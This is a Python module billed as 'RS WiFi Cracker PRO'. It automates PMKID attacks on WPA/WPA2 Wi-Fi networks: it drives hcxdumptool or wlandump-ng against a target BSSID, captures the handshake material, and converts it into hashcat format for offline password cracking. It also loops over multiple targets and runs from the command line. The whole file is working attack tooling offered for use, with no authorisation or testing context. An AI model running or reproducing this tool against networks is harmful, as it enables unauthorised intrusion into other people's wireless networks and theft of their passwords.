#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
RS WiFi Cracker PRO - PMKID Attack Module
Offline WPA/WPA2 attack without client interaction
"""

import os
import re
import time
import subprocess
from typing import Dict, Optional, Tuple
from dataclasses import dataclass
from datetime import datetime


@dataclass
class PMKIDResult:
    """PMKID attack result"""
    success: bool
    bssid: str
    essid: str = ""
    pmkid_file: str = ""
    time_taken: float = 0.0
    error: str = ""
    details: Dict = None


class PMKIDAttacker:
    """PMKID Attack Engine"""
    
    def __init__(self, interface: str):
        self.interface = interface
        self.process = None
        self.running = False
        self.output_dir = "/tmp/pmkid_captures"
        os.makedirs(self.output_dir, exist_ok=True)
        self.stats = {
            'attacks_launched': 0,
            'attacks_successful': 0,
            'total_captures': 0
        }
    
    def attack(self, bssid: str, essid: str = "", timeout: int = 60,
               channel: int = None) -> PMKIDResult:
        """Execute PMKID attack"""
        self.stats['attacks_launched'] += 1
        start_time = time.time()
        self.running = True
        
        # Set channel if provided
        if channel:
            self._set_channel(channel)
        
        output_file = f"{self.output_dir}/pmkid_{bssid.replace(':', '')}_{int(time.time())}.pcapng"
        
        # Try hcxdumptool first (more reliable for PMKID)
        result = self._attack_hcxdumptool(bssid, output_file, timeout)
        
        if not result.success:
            # Try alternative method
            result = self._attack_wlandump(bssid, output_file, timeout)
        
        result.time_taken = time.time() - start_time
        
        if result.success:
            self.stats['attacks_successful'] += 1
            self.stats['total_captures'] += 1
        
        return result
    
    def _attack_hcxdumptool(self, bssid: str, output_file: str, 
                            timeout: int) -> PMKIDResult:
        """PMKID attack using hcxdumptool"""
        try:
            # Create filter file
            filter_file = f"/tmp/pmkid_filter_{int(time.time())}.txt"
            with open(filter_file, 'w') as f:
                f.write(bssid.replace(':', ''))
            
            cmd = [
                'sudo', 'hcxdumptool',
                '-i', self.interface,
                '-o', output_file,
                '--enable_status=1',
                '--filterlist_ap', filter_file,
                '--filtermode=2'
            ]
            
            self.process = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
            )
            
            pmkid_captured = False
            start_time = time.time()
            
            while time.time() - start_time < timeout and self.running:
                line = self.process.stdout.readline()
                
                if 'PMKID' in line or 'EAPOL' in line:
                    pmkid_captured = True
                    break
            
            self.process.terminate()
            os.remove(filter_file)
            
            if pmkid_captured and os.path.exists(output_file):
                # Convert to hashcat format
                hash_file = self._convert_to_hashcat(output_file)
                
                return PMKIDResult(
                    success=True,
                    bssid=bssid,
                    pmkid_file=hash_file or output_file,
                    details={'raw_capture': output_file}
                )
            
            return PMKIDResult(
                success=False,
                bssid=bssid,
                error="PMKID not captured within timeout"
            )
            
        except FileNotFoundError:
            return PMKIDResult(
                success=False,
                bssid=bssid,
                error="hcxdumptool not found. Install: apt install hcxdumptool"
            )
        except Exception as e:
            return PMKIDResult(
                success=False,
                bssid=bssid,
                error=str(e)
            )
    
    def _attack_wlandump(self, bssid: str, output_file: str,
                         timeout: int) -> PMKIDResult:
        """Alternative PMKID attack using wlandump-ng"""
        try:
            cmd = [
                'sudo', 'wlandump-ng',
                '-i', self.interface,
                '-b', bssid,
                '-c', '6',  # Channel
                '-w', output_file
            ]
            
            self.process = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
            )
            
            self.process.communicate(timeout=timeout)
            
            if os.path.exists(output_file):
                # Check for PMKID
                if self._verify_pmkid(output_file, bssid):
                    hash_file = self._convert_to_hashcat(output_file)
                    
                    return PMKIDResult(
                        success=True,
                        bssid=bssid,
                        pmkid_file=hash_file or output_file
                    )
            
            return PMKIDResult(
                success=False,
                bssid=bssid,
                error="PMKID not captured"
            )
            
        except FileNotFoundError:
            return PMKIDResult(
                success=False,
                bssid=bssid,
                error="wlandump-ng not found"
            )
        except Exception as e:
            return PMKIDResult(
                success=False,
                bssid=bssid,
                error=str(e)
            )
    
    def _set_channel(self, channel: int) -> bool:
        """Set interface channel"""
        try:
            subprocess.run(
                ['sudo', 'iwconfig', self.interface, 'channel', str(channel)],
                capture_output=True, timeout=5
            )
            return True
        except:
            return False
    
    def _verify_pmkid(self, capture_file: str, bssid: str) -> bool:
        """Verify PMKID in capture file"""
        try:
            result = subprocess.run(
                ['hcxpcapngtool', '-o', '/tmp/pmkid_check.txt', capture_file],
                capture_output=True, text=True
            )
            
            if 'PMKID' in result.stdout:
                return True
            
            # Check with aircrack
            result = subprocess.run(
                ['aircrack-ng', capture_file],
                capture_output=True, text=True
            )
            
            return 'PMKID' in result.stdout
            
        except:
            return False
    
    def _convert_to_hashcat(self, capture_file: str) -> Optional[str]:
        """Convert capture to hashcat format"""
        hash_file = capture_file.replace('.pcapng', '.hash')
        
        try:
            # Use hcxpcapngtool
            result = subprocess.run(
                ['hcxpcapngtool', '-o', hash_file, capture_file],
                capture_output=True, text=True
            )
            
            if os.path.exists(hash_file):
                return hash_file
            
            # Alternative: hcxpcaptool
            result = subprocess.run(
                ['hcxpcaptool', '-o', hash_file, capture_file],
                capture_output=True, text=True
            )
            
            if os.path.exists(hash_file):
                return hash_file
            
        except FileNotFoundError:
            pass
        
        return None
    
    def capture_multiple(self, targets: list, timeout_per_target: int = 30) -> Dict[str, PMKIDResult]:
        """Capture PMKID from multiple targets"""
        results = {}
        
        for target in targets:
            bssid = target.bssid if hasattr(target, 'bssid') else target
            essid = target.essid if hasattr(target, 'essid') else ""
            channel = target.channel if hasattr(target, 'channel') else None
            
            result = self.attack(bssid, essid, timeout_per_target, channel)
            results[bssid] = result
        
        return results
    
    def stop(self):
        """Stop ongoing attack"""
        self.running = False
        if self.process:
            self.process.terminate()
    
    def get_stats(self) -> Dict:
        """Get attack statistics"""
        return self.stats.copy()


if __name__ == '__main__':
    import sys
    
    if len(sys.argv) < 3:
        print("Usage: python pmkid.py <interface> <bssid> [channel]")
        sys.exit(1)
    
    interface = sys.argv[1]
    bssid = sys.argv[2]
    channel = int(sys.argv[3]) if len(sys.argv) > 3 else None
    
    attacker = PMKIDAttacker(interface)
    
    print(f"Capturing PMKID from {bssid}...")
    result = attacker.attack(bssid, channel=channel)
    
    if result.success:
        print(f"PMKID captured: {result.pmkid_file}")
    else:
        print(f"Failed: {result.error}")
